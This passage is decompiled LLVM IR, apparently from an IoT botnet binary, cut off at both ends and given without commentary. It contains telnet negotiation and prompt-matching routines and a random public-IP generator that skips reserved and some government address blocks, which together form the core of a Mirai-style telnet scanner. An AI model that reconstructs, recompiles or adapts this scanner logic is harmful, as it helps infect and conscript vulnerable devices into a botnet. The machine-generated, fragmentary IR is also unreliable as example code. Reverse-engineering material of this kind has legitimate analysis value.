  %v2_1000291c = ptrtoint i8* %stack_var_-56 to i32
  store i32 268446000, i32* @lr, align 4
  %v4_1000292c = call i32 @__libc_send(i32 %arg1, i32 %v2_1000291c, i32 1, i32 16384)
  %v2_10002938 = load i8, i8* %v1_100028d0, align 1
  %v3_10002940 = icmp eq i8 %v2_10002938, -4
  br i1 %v3_10002940, label %dec_label_pc_10002948, label %dec_label_pc_10002954

dec_label_pc_10002948:                            ; preds = %dec_label_pc_10002910
  store i8 -2, i8* %stack_var_-56, align 1
  br label %dec_label_pc_100029fc

dec_label_pc_10002954:                            ; preds = %dec_label_pc_10002910
  %v2_1000295c = load i8, i8* %v1_100028d0, align 1
  %v3_10002964 = icmp eq i8 %v2_1000295c, -2
  br i1 %v3_10002964, label %dec_label_pc_1000296c, label %dec_label_pc_10002978

dec_label_pc_1000296c:                            ; preds = %dec_label_pc_10002954
  store i8 -4, i8* %stack_var_-56, align 1
  br label %dec_label_pc_100029fc

dec_label_pc_10002978:                            ; preds = %dec_label_pc_10002954
  %v2_10002980 = load i8, i8* %v1_100028d0, align 1
  %v3_10002988 = icmp eq i8 %v2_10002980, 3
  br i1 %v3_10002988, label %dec_label_pc_10002990, label %dec_label_pc_100029c8

dec_label_pc_10002990:                            ; preds = %dec_label_pc_10002978
  store i8 -3, i8* %stack_var_-56, align 1
  br label %dec_label_pc_100029fc

dec_label_pc_100029c8:                            ; preds = %dec_label_pc_10002978
  %v3_100029a0 = icmp eq i8 %v2_10002980, -3
  %.7 = select i1 %v3_100029a0, i8 -4, i8 -2
  store i8 %.7, i8* %stack_var_-56, align 1
  br label %dec_label_pc_100029fc

dec_label_pc_100029fc:                            ; preds = %dec_label_pc_10002990, %dec_label_pc_1000296c, %dec_label_pc_10002948, %dec_label_pc_100029c8
  store i32 268446228, i32* @lr, align 4
  %v4_10002a10 = call i32 @__libc_send(i32 %arg1, i32 %v2_1000291c, i32 1, i32 16384)
  %v1_10002a18 = add i32 %arg2, 2
  store i32 ptrtoint (i32* @global_var_10002a30.47 to i32), i32* @lr, align 4
  %v4_10002a2c = call i32 @__libc_send(i32 %arg1, i32 %v1_10002a18, i32 1, i32 16384)
  br label %dec_label_pc_10002a38

dec_label_pc_10002a38:                            ; preds = %dec_label_pc_100028f4, %dec_label_pc_100029fc, %entry
  ret i32 0

; uselistorder directives
  uselistorder i8* %stack_var_-56, { 5, 4, 3, 2, 0, 1 }
  uselistorder i8 -3, { 1, 0 }
  uselistorder label %dec_label_pc_10002a38, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100029fc, { 3, 0, 1, 2 }
}

define i32 @matchPrompt(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %v0_10002a84 = call i32 @__GI_strlen()
  store i32 ptrtoint ([6 x i8]* @global_var_10011ca0.48 to i32), i32* @r3, align 4
  %v0_10002bc010 = call i32 @__GI_strlen()
  %v2_10002bc812 = icmp eq i32 %v0_10002bc010, 0
  br i1 %v2_10002bc812, label %dec_label_pc_10002bd8, label %dec_label_pc_10002ab0.preheader.lr.ph

dec_label_pc_10002ab0.preheader.lr.ph:            ; preds = %entry
  %v2_10002acc = add i32 %v0_10002a84, %arg1
  br label %dec_label_pc_10002ab0.preheader

dec_label_pc_10002aa4:                            ; preds = %dec_label_pc_10002b38, %dec_label_pc_10002b10, %dec_label_pc_10002ae8, %dec_label_pc_10002ac0
  %v1_10002aa8 = add nsw i32 %stack_var_-40.08, 1
  %v3_10002ab8 = icmp sgt i32 %v0_10002a84, %v1_10002aa8
  br i1 %v3_10002ab8, label %dec_label_pc_10002ac0, label %dec_label_pc_10002b60

dec_label_pc_10002ac0:                            ; preds = %dec_label_pc_10002ab0.preheader, %dec_label_pc_10002aa4
  %stack_var_-40.08 = phi i32 [ %v1_10002aa8, %dec_label_pc_10002aa4 ], [ %stack_var_-40.115, %dec_label_pc_10002ab0.preheader ]
  %v2_10002ad4 = sub i32 %v2_10002acc, %stack_var_-40.08
  %v1_10002ad8 = inttoptr i32 %v2_10002ad4 to i8*
  %v2_10002ad8 = load i8, i8* %v1_10002ad8, align 1
  %v3_10002ae0 = icmp eq i8 %v2_10002ad8, 0
  br i1 %v3_10002ae0, label %dec_label_pc_10002aa4, label %dec_label_pc_10002ae8

dec_label_pc_10002ae8:                            ; preds = %dec_label_pc_10002ac0
  %v2_10002b00 = load i8, i8* %v1_10002ad8, align 1
  %v3_10002b08 = icmp eq i8 %v2_10002b00, 32
  br i1 %v3_10002b08, label %dec_label_pc_10002aa4, label %dec_label_pc_10002b10

dec_label_pc_10002b10:                            ; preds = %dec_label_pc_10002ae8
  %v2_10002b28 = load i8, i8* %v1_10002ad8, align 1
  %v3_10002b30 = icmp eq i8 %v2_10002b28, 13
  br i1 %v3_10002b30, label %dec_label_pc_10002aa4, label %dec_label_pc_10002b38

dec_label_pc_10002b38:                            ; preds = %dec_label_pc_10002b10
  %v2_10002b50 = load i8, i8* %v1_10002ad8, align 1
  %v3_10002b58 = icmp eq i8 %v2_10002b50, 10
  br i1 %v3_10002b58, label %dec_label_pc_10002aa4, label %dec_label_pc_10002b60

dec_label_pc_10002b60:                            ; preds = %dec_label_pc_10002b38, %dec_label_pc_10002aa4, %dec_label_pc_10002ab0.preheader
  %stack_var_-40.0.lcssa = phi i32 [ %stack_var_-40.115, %dec_label_pc_10002ab0.preheader ], [ %stack_var_-40.08, %dec_label_pc_10002b38 ], [ %v1_10002aa8, %dec_label_pc_10002aa4 ]
  %v2_10002b74 = sub i32 %v2_10002acc, %stack_var_-40.0.lcssa
  %v1_10002b78 = inttoptr i32 %v2_10002b74 to i8*
  %v2_10002b78 = load i8, i8* %v1_10002b78, align 1
  %v2_10002b8c = add i32 %storemerge316, ptrtoint ([6 x i8]* @global_var_10011ca0.48 to i32)
  %v1_10002b90 = inttoptr i32 %v2_10002b8c to i8*
  %v2_10002b90 = load i8, i8* %v1_10002b90, align 1
  %v4_10002b98 = icmp eq i8 %v2_10002b78, %v2_10002b90
  br i1 %v4_10002b98, label %dec_label_pc_10002bd8, label %dec_label_pc_10002bac

dec_label_pc_10002bac:                            ; preds = %dec_label_pc_10002b60
  %v1_10002bb0 = add i32 %storemerge316, 1
  store i32 ptrtoint ([6 x i8]* @global_var_10011ca0.48 to i32), i32* @r3, align 4
  %v0_10002bc0 = call i32 @__GI_strlen()
  %v2_10002bc8 = icmp ult i32 %v1_10002bb0, %v0_10002bc0
  br i1 %v2_10002bc8, label %dec_label_pc_10002ab0.preheader, label %dec_label_pc_10002bd8

dec_label_pc_10002ab0.preheader:                  ; preds = %dec_label_pc_10002ab0.preheader.lr.ph, %dec_label_pc_10002bac
  %storemerge316 = phi i32 [ 0, %dec_label_pc_10002ab0.preheader.lr.ph ], [ %v1_10002bb0, %dec_label_pc_10002bac ]
  %stack_var_-40.115 = phi i32 [ 0, %dec_label_pc_10002ab0.preheader.lr.ph ], [ %stack_var_-40.0.lcssa, %dec_label_pc_10002bac ]
  %v3_10002ab86 = icmp sgt i32 %v0_10002a84, %stack_var_-40.115
  br i1 %v3_10002ab86, label %dec_label_pc_10002ac0, label %dec_label_pc_10002b60

dec_label_pc_10002bd8:                            ; preds = %entry, %dec_label_pc_10002b60, %dec_label_pc_10002bac
  %storemerge = phi i32 [ 0, %entry ], [ 1, %dec_label_pc_10002b60 ], [ 0, %dec_label_pc_10002bac ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %stack_var_-40.115, { 2, 0, 1 }
  uselistorder i32 %storemerge316, { 1, 0 }
  uselistorder i32 %v1_10002bb0, { 1, 0 }
  uselistorder i32 %v0_10002a84, { 1, 2, 0 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_10011ca0.48 to i32), { 2, 1, 0 }
  uselistorder label %dec_label_pc_10002bd8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10002ab0.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10002b60, { 2, 0, 1 }
}

define i32 @readUntil(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %v0_10002c2c = load i32, i32* @r10, align 4
  store i32 %arg4, i32* %stack_var_-64, align 4
  %v1_10002e6c5 = add i32 %v0_10002c2c, 2
  %v2_10002e746 = icmp slt i32 %v1_10002e6c5, %arg7
  br i1 %v2_10002e746, label %dec_label_pc_10002e7c.lr.ph, label %dec_label_pc_10002eac

dec_label_pc_10002e7c.lr.ph:                      ; preds = %entry
  %v2_10002c64 = ptrtoint i32* %stack_var_-192 to i32
  %v1_10002cac = udiv i32 %arg1, 32
  %v1_10002cb4 = mul nuw nsw i32 %v1_10002cac, 4
  %v2_10002cb8 = ptrtoint i32* %stack_var_-216 to i32
  %v2_10002cbc = add nuw nsw i32 %v1_10002cb4, 24
  %v1_10002cc0 = add i32 %v2_10002cbc, %v2_10002cb8
  %v1_10002cc4 = inttoptr i32 %v1_10002cc0 to i32*
  %v1_10002ccc = urem i32 %arg1, 32
  %v3_10002cd4 = shl i32 1, %v1_10002ccc
  %v1_10002cf4 = add i32 %arg1, 1
  %v2_10002cfc = ptrtoint i32* %stack_var_-64 to i32
  %v4_10002e2c = inttoptr i32 %arg2 to i8*
  %v3_10002e40 = icmp eq i32 %arg3, 0
  %v2_10002e8c = icmp sgt i32 %arg5, 0
  br label %dec_label_pc_10002e7c

dec_label_pc_10002c64:                            ; preds = %dec_label_pc_10002e88, %dec_label_pc_10002e7c
  store i32 %v2_10002c64, i32* %stack_var_-216, align 4
  store i32 0, i32* %stack_var_-192, align 4
  br label %dec_label_pc_10002c78.dec_label_pc_10002c78_crit_edge

dec_label_pc_10002c78.dec_label_pc_10002c78_crit_edge: ; preds = %dec_label_pc_10002c78.dec_label_pc_10002c78_crit_edge.dec_label_pc_10002c78.dec_label_pc_10002c78_crit_edge_crit_edge, %dec_label_pc_10002c64
  %v3_10002c7c.pre = phi i32 [ %v2_10002c64, %dec_label_pc_10002c64 ], [ %v3_10002c7c.pre.pre, %dec_label_pc_10002c78.dec_label_pc_10002c78_crit_edge.dec_label_pc_10002c78.dec_label_pc_10002c78_crit_edge_crit_edge ]
  %v1_10002c9436 = phi i32 [ 1, %dec_label_pc_10002c64 ], [ %v1_10002c94, %dec_label_pc_10002c78.dec_label_pc_10002c78_crit_edge.dec_label_pc_10002c78.dec_label_pc_10002c78_crit_edge_crit_edge ]
  %v1_10002c80 = mul nuw nsw i32 %v1_10002c9436, 4
  %v2_10002c84 = add i32 %v1_10002c80, %v3_10002c7c.pre
  %v2_10002c8c = inttoptr i32 %v2_10002c84 to i32*
  store i32 0, i32* %v2_10002c8c, align 4
  %v1_10002c94 = add nuw nsw i32 %v1_10002c9436, 1
  %tmp33 = icmp ult i32 %v1_10002c94, 32
  br i1 %tmp33, label %dec_label_pc_10002c78.dec_label_pc_10002c78_crit_edge.dec_label_pc_10002c78.dec_label_pc_10002c78_crit_edge_crit_edge, label %dec_label_pc_10002ca8

dec_label_pc_10002c78.dec_label_pc_10002c78_crit_edge.dec_label_pc_10002c78.dec_label_pc_10002c78_crit_edge_crit_edge: ; preds = %dec_label_pc_10002c78.dec_label_pc_10002c78_crit_edge
  %v3_10002c7c.pre.pre = load i32, i32* %stack_var_-216, align 4
  br label %dec_label_pc_10002c78.dec_label_pc_10002c78_crit_edge

dec_label_pc_10002ca8:                            ; preds = %dec_label_pc_10002c78.dec_label_pc_10002c78_crit_edge
  %v2_10002cc4 = load i32, i32* %v1_10002cc4, align 4
  %v2_10002cd8 = or i32 %v2_10002cc4, %v3_10002cd4
  store i32 %v2_10002cd8, i32* %v1_10002cc4, align 4
  store i32 268447000, i32* @lr, align 4
  %v5_10002d14 = call i32 @__libc_select(i32 %v1_10002cf4, i32 %v2_10002c64, i32 0, i32 0, i32 %v2_10002cfc)
  %tmp34 = icmp slt i32 %v5_10002d14, 1
  br i1 %tmp34, label %dec_label_pc_10002eac, label %dec_label_pc_10002d24

dec_label_pc_10002d24:                            ; preds = %dec_label_pc_10002ca8
  %v2_10002d30 = add i32 %stack_var_-196.09, %arg6
  store i32 268447052, i32* @lr, align 4
  %v4_10002d48 = call i32 @__libc_recv(i32 %arg1, i32 %v2_10002d30, i32 1, i32 0)
  %v4_10002d5c = icmp eq i32 %v4_10002d48, -1
  br i1 %v4_10002d5c, label %dec_label_pc_10002d70, label %dec_label_pc_10002d64

dec_label_pc_10002d64:                            ; preds = %dec_label_pc_10002d24
  %v3_10002d68 = icmp eq i32 %v4_10002d48, 0
  br i1 %v3_10002d68, label %dec_label_pc_10002d70, label %dec_label_pc_10002d7c

dec_label_pc_10002d70:                            ; preds = %dec_label_pc_10002d64, %dec_label_pc_10002d24
  br label %dec_label_pc_10002eb4

dec_label_pc_10002d7c:                            ; preds = %dec_label_pc_10002d64
  %v2_10002d84 = add i32 %v4_10002d48, %stack_var_-196.09
  %v4_10002d8c = inttoptr i32 %v2_10002d30 to i8*
  %v3_10002d90 = load i8, i8* %v4_10002d8c, align 1
  %v3_10002d98 = icmp eq i8 %v3_10002d90, -1
  br i1 %v3_10002d98, label %dec_label_pc_10002da0, label %dec_label_pc_10002e24

dec_label_pc_10002da0:                            ; preds = %dec_label_pc_10002d7c
  %v1_10002da4 = add i32 %v2_10002d30, 1
  store i32 268447164, i32* @lr, align 4
  %v4_10002db8 = call i32 @__libc_recv(i32 %arg1, i32 %v1_10002da4, i32 2, i32 0)
  %v4_10002dcc = icmp eq i32 %v4_10002db8, -1
  br i1 %v4_10002dcc, label %dec_label_pc_10002de0, label %dec_label_pc_10002dd4

dec_label_pc_10002dd4:                            ; preds = %dec_label_pc_10002da0
  %v3_10002dd8 = icmp eq i32 %v4_10002db8, 0
  br i1 %v3_10002dd8, label %dec_label_pc_10002de0, label %dec_label_pc_10002dec

dec_label_pc_10002de0:                            ; preds = %dec_label_pc_10002dd4, %dec_label_pc_10002da0
  br label %dec_label_pc_10002eb4

dec_label_pc_10002dec:                            ; preds = %dec_label_pc_10002dd4
  %v2_10002df4 = add i32 %v4_10002db8, %v2_10002d84
  store i32 268447244, i32* @lr, align 4
  %v4_10002e08 = call i32 @negotiate(i32 %arg1, i32 %v2_10002d30, i32 3, i32 %v2_10002d84)
  %v3_10002e10 = icmp eq i32 %v4_10002e08, 0
  br i1 %v3_10002e10, label %dec_label_pc_10002e18, label %dec_label_pc_10002e68.backedge

dec_label_pc_10002e18:                            ; preds = %dec_label_pc_10002dec
  br label %dec_label_pc_10002eb4

dec_label_pc_10002e24:                            ; preds = %dec_label_pc_10002d7c
  store i32 268447280, i32* @lr, align 4
  %v5_10002e2c = call i32 @strstr(i32 %arg6, i8* %v4_10002e2c, i32 %v2_10002d30)
  %v3_10002e34 = icmp eq i32 %v5_10002e2c, 0
  br i1 %v3_10002e34, label %dec_label_pc_10002e3c, label %dec_label_pc_10002ea0

dec_label_pc_10002e3c:                            ; preds = %dec_label_pc_10002e24
  br i1 %v3_10002e40, label %dec_label_pc_10002e68.backedge, label %dec_label_pc_10002e48

dec_label_pc_10002e68.backedge:                   ; preds = %dec_label_pc_10002e3c, %dec_label_pc_10002e48, %dec_label_pc_10002dec
  %stack_var_-196.0.be = phi i32 [ %v2_10002df4, %dec_label_pc_10002dec ], [ %v2_10002d84, %dec_label_pc_10002e3c ], [ %v2_10002d84, %dec_label_pc_10002e48 ]
  %v1_10002e6c = add i32 %stack_var_-196.0.be, 2
  %v2_10002e74 = icmp slt i32 %v1_10002e6c, %arg7
  br i1 %v2_10002e74, label %dec_label_pc_10002e68.backedge.dec_label_pc_10002e7c_crit_edge, label %dec_label_pc_10002eac

dec_label_pc_10002e68.backedge.dec_label_pc_10002e7c_crit_edge: ; preds = %dec_label_pc_10002e68.backedge
  %v3_10002e7c.pre = load i32, i32* %stack_var_-64, align 4
  br label %dec_label_pc_10002e7c

dec_label_pc_10002e48:                            ; preds = %dec_label_pc_10002e3c
  %v1_10002e4c = call i32 @matchPrompt(i32 %arg6)
  %v3_10002e54 = icmp eq i32 %v1_10002e4c, 0
  br i1 %v3_10002e54, label %dec_label_pc_10002e68.backedge, label %dec_label_pc_10002ea0

dec_label_pc_10002e7c:                            ; preds = %dec_label_pc_10002e68.backedge.dec_label_pc_10002e7c_crit_edge, %dec_label_pc_10002e7c.lr.ph
  %v3_10002e7c = phi i32 [ %arg4, %dec_label_pc_10002e7c.lr.ph ], [ %v3_10002e7c.pre, %dec_label_pc_10002e68.backedge.dec_label_pc_10002e7c_crit_edge ]
  %stack_var_-196.09 = phi i32 [ %v0_10002c2c, %dec_label_pc_10002e7c.lr.ph ], [ %stack_var_-196.0.be, %dec_label_pc_10002e68.backedge.dec_label_pc_10002e7c_crit_edge ]
  %v2_10002e80 = icmp sgt i32 %v3_10002e7c, 0
  br i1 %v2_10002e80, label %dec_label_pc_10002c64, label %dec_label_pc_10002e88

dec_label_pc_10002e88:                            ; preds = %dec_label_pc_10002e7c
  br i1 %v2_10002e8c, label %dec_label_pc_10002c64, label %dec_label_pc_10002eac

dec_label_pc_10002ea0:                            ; preds = %dec_label_pc_10002e24, %dec_label_pc_10002e48
  br label %dec_label_pc_10002eb4

dec_label_pc_10002eac:                            ; preds = %dec_label_pc_10002e68.backedge, %dec_label_pc_10002e88, %dec_label_pc_10002ca8, %entry
  br label %dec_label_pc_10002eb4

dec_label_pc_10002eb4:                            ; preds = %dec_label_pc_10002ea0, %dec_label_pc_10002e18, %dec_label_pc_10002de0, %dec_label_pc_10002d70, %dec_label_pc_10002eac
  %stack_var_-24.0 = phi i32 [ 0, %dec_label_pc_10002eac ], [ 1, %dec_label_pc_10002ea0 ], [ 0, %dec_label_pc_10002d70 ], [ 0, %dec_label_pc_10002de0 ], [ 0, %dec_label_pc_10002e18 ]
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i32 %stack_var_-196.09, { 1, 0 }
  uselistorder i32 %stack_var_-196.0.be, { 1, 0 }
  uselistorder i32 %v2_10002d84, { 1, 2, 3, 0 }
  uselistorder i32 %v1_10002c94, { 1, 0 }
  uselistorder i32 %v2_10002c64, { 1, 0, 2 }
  uselistorder i32* %stack_var_-64, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @negotiate, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 4, 3, 2, 1, 0 }
  uselistorder i32 %arg7, { 1, 0 }
  uselistorder i32 %arg6, { 1, 2, 0 }
  uselistorder i32 %arg1, { 2, 3, 4, 5, 1, 0 }
  uselistorder label %dec_label_pc_10002eb4, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_10002eac, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10002ea0, { 1, 0 }
  uselistorder label %dec_label_pc_10002e68.backedge, { 1, 0, 2 }
}

define i32 @GetRandomPublicIP(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-56 = alloca i32, align 4
  store i32 268447468, i32* @lr, align 4
  %v0_10002ee8 = call i32 @random()
  %v2_10002f08 = srem i32 %v0_10002ee8, 223
  %v1_10002f2c = trunc i32 %v2_10002f08 to i8
  store i8 %v1_10002f2c, i8* @global_var_10024a48.49, align 1
  store i32 268447540, i32* @lr, align 4
  %v0_10002f30 = call i32 @random()
  %v2_10002f50 = srem i32 %v0_10002f30, 255
  %v1_10002f74 = trunc i32 %v2_10002f50 to i8
  store i8 %v1_10002f74, i8* @global_var_10024a49.50, align 1
  store i32 268447612, i32* @lr, align 4
  %v0_10002f78 = call i32 @random()
  %v2_10002f98 = srem i32 %v0_10002f78, 255
  %v1_10002fbc = trunc i32 %v2_10002f98 to i8
  store i8 %v1_10002fbc, i8* @global_var_10024a4a.51, align 1
  store i32 268447684, i32* @lr, align 4
  %v0_10002fc0 = call i32 @random()
  %v2_10002fe0 = srem i32 %v0_10002fc0, 255
  %extract.t = trunc i32 %v2_10002fe0 to i8
  br label %dec_label_pc_1000312c

dec_label_pc_1000300c:                            ; preds = %dec_label_pc_100033c0, %dec_label_pc_100033ac, %dec_label_pc_10003398, %dec_label_pc_10003384, %dec_label_pc_10003370, %dec_label_pc_1000335c, %dec_label_pc_10003348, %dec_label_pc_10003334, %dec_label_pc_10003320, %dec_label_pc_1000330c, %dec_label_pc_100032f8, %dec_label_pc_100032e4, %dec_label_pc_100032d0, %dec_label_pc_100032bc, %dec_label_pc_100032a8, %dec_label_pc_1000326c, %dec_label_pc_10003244, %dec_label_pc_10003208, %dec_label_pc_100031cc, %dec_label_pc_100031a4, %dec_label_pc_10003190, %dec_label_pc_1000317c, %dec_label_pc_10003168, %dec_label_pc_10003154, %dec_label_pc_10003140, %dec_label_pc_1000312c
  store i32 268447760, i32* @lr, align 4
  %v0_1000300c = call i32 @random()
  %v2_1000302c = srem i32 %v0_1000300c, 223
  %v1_10003050 = trunc i32 %v2_1000302c to i8
  store i8 %v1_10003050, i8* @global_var_10024a48.49, align 1
  store i32 268447832, i32* @lr, align 4
  %v0_10003054 = call i32 @random()
  %v2_10003074 = srem i32 %v0_10003054, 255
  %v1_10003098 = trunc i32 %v2_10003074 to i8
  store i8 %v1_10003098, i8* @global_var_10024a49.50, align 1
  store i32 268447904, i32* @lr, align 4
  %v0_1000309c = call i32 @random()
  %v2_100030bc = srem i32 %v0_1000309c, 255
  %v1_100030e0 = trunc i32 %v2_100030bc to i8
  store i8 %v1_100030e0, i8* @global_var_10024a4a.51, align 1
  store i32 268447976, i32* @lr, align 4
  %v0_100030e4 = call i32 @random()
  %v2_10003104 = srem i32 %v0_100030e4, 255
  %extract.t32 = trunc i32 %v2_10003104 to i8
  br label %dec_label_pc_1000312c

dec_label_pc_1000312c:                            ; preds = %entry, %dec_label_pc_1000300c
  %storemerge.in.off0 = phi i8 [ %extract.t, %entry ], [ %extract.t32, %dec_label_pc_1000300c ]
  store i8 %storemerge.in.off0, i8* @global_var_10024a4b.52, align 1
  %v3_10003130 = load i8, i8* @global_var_10024a48.49, align 1
  %v4_10003130 = zext i8 %v3_10003130 to i32
  %v3_10003138 = icmp eq i8 %v3_10003130, 127
  br i1 %v3_10003138, label %dec_label_pc_1000300c, label %dec_label_pc_10003140

dec_label_pc_10003140:                            ; preds = %dec_label_pc_1000312c
  %v3_1000314c = icmp eq i8 %v3_10003130, 0
  br i1 %v3_1000314c, label %dec_label_pc_1000300c, label %dec_label_pc_10003154

dec_label_pc_10003154:                            ; preds = %dec_label_pc_10003140
  %v3_10003160 = icmp eq i8 %v3_10003130, 3
  br i1 %v3_10003160, label %dec_label_pc_1000300c, label %dec_label_pc_10003168

dec_label_pc_10003168:                            ; preds = %dec_label_pc_10003154
  %v3_10003174 = icmp eq i8 %v3_10003130, 15
  br i1 %v3_10003174, label %dec_label_pc_1000300c, label %dec_label_pc_1000317c

dec_label_pc_1000317c:                            ; preds = %dec_label_pc_10003168
  %v3_10003188 = icmp eq i8 %v3_10003130, 16
  br i1 %v3_10003188, label %dec_label_pc_1000300c, label %dec_label_pc_10003190

dec_label_pc_10003190:                            ; preds = %dec_label_pc_1000317c
  %v3_1000319c = icmp eq i8 %v3_10003130, 56
  br i1 %v3_1000319c, label %dec_label_pc_1000300c, label %dec_label_pc_100031a4

dec_label_pc_100031a4:                            ; preds = %dec_label_pc_10003190
  %v3_100031b0 = icmp eq i8 %v3_10003130, 10
  br i1 %v3_100031b0, label %dec_label_pc_1000300c, label %dec_label_pc_100031b8

dec_label_pc_100031b8:                            ; preds = %dec_label_pc_100031a4
  %v3_100031c4 = icmp eq i8 %v3_10003130, -64
  br i1 %v3_100031c4, label %dec_label_pc_100031cc, label %dec_label_pc_100031e0

dec_label_pc_100031cc:                            ; preds = %dec_label_pc_100031b8
  %v3_100031d0 = load i8, i8* @global_var_10024a49.50, align 1
  %v3_100031d8 = icmp eq i8 %v3_100031d0, -88
  br i1 %v3_100031d8, label %dec_label_pc_1000300c, label %dec_label_pc_100031e0

dec_label_pc_100031e0:                            ; preds = %dec_label_pc_100031b8, %dec_label_pc_100031cc
  %v3_100031ec = icmp eq i8 %v3_10003130, -84
  br i1 %v3_100031ec, label %dec_label_pc_100031f4, label %dec_label_pc_1000321c

dec_label_pc_100031f4:                            ; preds = %dec_label_pc_100031e0
  %v3_100031f8 = load i8, i8* @global_var_10024a49.50, align 1
  %tmp26 = icmp ult i8 %v3_100031f8, 16
  br i1 %tmp26, label %dec_label_pc_1000321c, label %dec_label_pc_10003208

dec_label_pc_10003208:                            ; preds = %dec_label_pc_100031f4
  %tmp27 = icmp ult i8 %v3_100031f8, 32
  br i1 %tmp27, label %dec_label_pc_1000300c, label %dec_label_pc_1000321c

dec_label_pc_1000321c:                            ; preds = %dec_label_pc_100031e0, %dec_label_pc_10003208, %dec_label_pc_100031f4
  %v3_10003228 = icmp eq i8 %v3_10003130, 100
  br i1 %v3_10003228, label %dec_label_pc_10003230, label %dec_label_pc_10003258

dec_label_pc_10003230:                            ; preds = %dec_label_pc_1000321c
  %v3_10003234 = load i8, i8* @global_var_10024a49.50, align 1
  %tmp28 = icmp ult i8 %v3_10003234, 64
  br i1 %tmp28, label %dec_label_pc_10003258, label %dec_label_pc_10003244

dec_label_pc_10003244:                            ; preds = %dec_label_pc_10003230
  %tmp29 = icmp ult i8 %v3_10003234, 127
  br i1 %tmp29, label %dec_label_pc_1000300c, label %dec_label_pc_10003258

dec_label_pc_10003258:                            ; preds = %dec_label_pc_1000321c, %dec_label_pc_10003244, %dec_label_pc_10003230
  %v3_10003264 = icmp eq i8 %v3_10003130, -87
  br i1 %v3_10003264, label %dec_label_pc_1000326c, label %dec_label_pc_10003280

dec_label_pc_1000326c:                            ; preds = %dec_label_pc_10003258
  %v3_10003270 = load i8, i8* @global_var_10024a49.50, align 1
  %v3_10003278 = icmp eq i8 %v3_10003270, -1
  br i1 %v3_10003278, label %dec_label_pc_1000300c, label %dec_label_pc_10003280

dec_label_pc_10003280:                            ; preds = %dec_label_pc_10003258, %dec_label_pc_1000326c
  %v3_1000328c = icmp eq i8 %v3_10003130, -58
  br i1 %v3_1000328c, label %dec_label_pc_10003294, label %dec_label_pc_100032bc

dec_label_pc_10003294:                            ; preds = %dec_label_pc_10003280
  %v3_10003298 = load i8, i8* @global_var_10024a49.50, align 1
  %tmp30 = icmp ult i8 %v3_10003298, 18
  br i1 %tmp30, label %dec_label_pc_100032bc, label %dec_label_pc_100032a8

dec_label_pc_100032a8:                            ; preds = %dec_label_pc_10003294
  %tmp31 = icmp ult i8 %v3_10003298, 20
  br i1 %tmp31, label %dec_label_pc_1000300c, label %dec_label_pc_100032bc

dec_label_pc_100032bc:                            ; preds = %dec_label_pc_10003280, %dec_label_pc_100032a8, %dec_label_pc_10003294
  %v3_100032c8 = icmp eq i8 %v3_10003130, -32
  br i1 %v3_100032c8, label %dec_label_pc_1000300c, label %dec_label_pc_100032d0

dec_label_pc_100032d0:                            ; preds = %dec_label_pc_100032bc
  %v3_100032dc = icmp eq i8 %v3_10003130, 6
  br i1 %v3_100032dc, label %dec_label_pc_1000300c, label %dec_label_pc_100032e4

dec_label_pc_100032e4:                            ; preds = %dec_label_pc_100032d0
  %v3_100032f0 = icmp eq i8 %v3_10003130, 7
  br i1 %v3_100032f0, label %dec_label_pc_1000300c, label %dec_label_pc_100032f8

dec_label_pc_100032f8:                            ; preds = %dec_label_pc_100032e4
  %v3_10003304 = icmp eq i8 %v3_10003130, 11
  br i1 %v3_10003304, label %dec_label_pc_1000300c, label %dec_label_pc_1000330c

dec_label_pc_1000330c:                            ; preds = %dec_label_pc_100032f8
  %v3_10003318 = icmp eq i8 %v3_10003130, 21
  br i1 %v3_10003318, label %dec_label_pc_1000300c, label %dec_label_pc_10003320

dec_label_pc_10003320:                            ; preds = %dec_label_pc_1000330c
  %v3_1000332c = icmp eq i8 %v3_10003130, 22
  br i1 %v3_1000332c, label %dec_label_pc_1000300c, label %dec_label_pc_10003334

dec_label_pc_10003334:                            ; preds = %dec_label_pc_10003320
  %v3_10003340 = icmp eq i8 %v3_10003130, 26
  br i1 %v3_10003340, label %dec_label_pc_1000300c, label %dec_label_pc_10003348

dec_label_pc_10003348:                            ; preds = %dec_label_pc_10003334
  %v3_10003354 = icmp eq i8 %v3_10003130, 28
  br i1 %v3_10003354, label %dec_label_pc_1000300c, label %dec_label_pc_1000335c

dec_label_pc_1000335c:                            ; preds = %dec_label_pc_10003348
  %v3_10003368 = icmp eq i8 %v3_10003130, 29
  br i1 %v3_10003368, label %dec_label_pc_1000300c, label %dec_label_pc_10003370

dec_label_pc_10003370:                            ; preds = %dec_label_pc_1000335c
  %v3_1000337c = icmp eq i8 %v3_10003130, 30
  br i1 %v3_1000337c, label %dec_label_pc_1000300c, label %dec_label_pc_10003384

dec_label_pc_10003384:                            ; preds = %dec_label_pc_10003370
  %v3_10003390 = icmp eq i8 %v3_10003130, 33
  br i1 %v3_10003390, label %dec_label_pc_1000300c, label %dec_label_pc_10003398

dec_label_pc_10003398:                            ; preds = %dec_label_pc_10003384
  %v3_100033a4 = icmp eq i8 %v3_10003130, 55
  br i1 %v3_100033a4, label %dec_label_pc_1000300c, label %dec_label_pc_100033ac

dec_label_pc_100033ac:                            ; preds = %dec_label_pc_10003398
  %v3_100033b8 = icmp eq i8 %v3_10003130, -42
  br i1 %v3_100033b8, label %dec_label_pc_1000300c, label %dec_label_pc_100033c0

dec_label_pc_100033c0:                            ; preds = %dec_label_pc_100033ac
  %v3_100033cc = icmp eq i8 %v3_10003130, -41
  br i1 %v3_100033cc, label %dec_label_pc_1000300c, label %dec_label_pc_100033d4

dec_label_pc_100033d4:                            ; preds = %dec_label_pc_100033c0
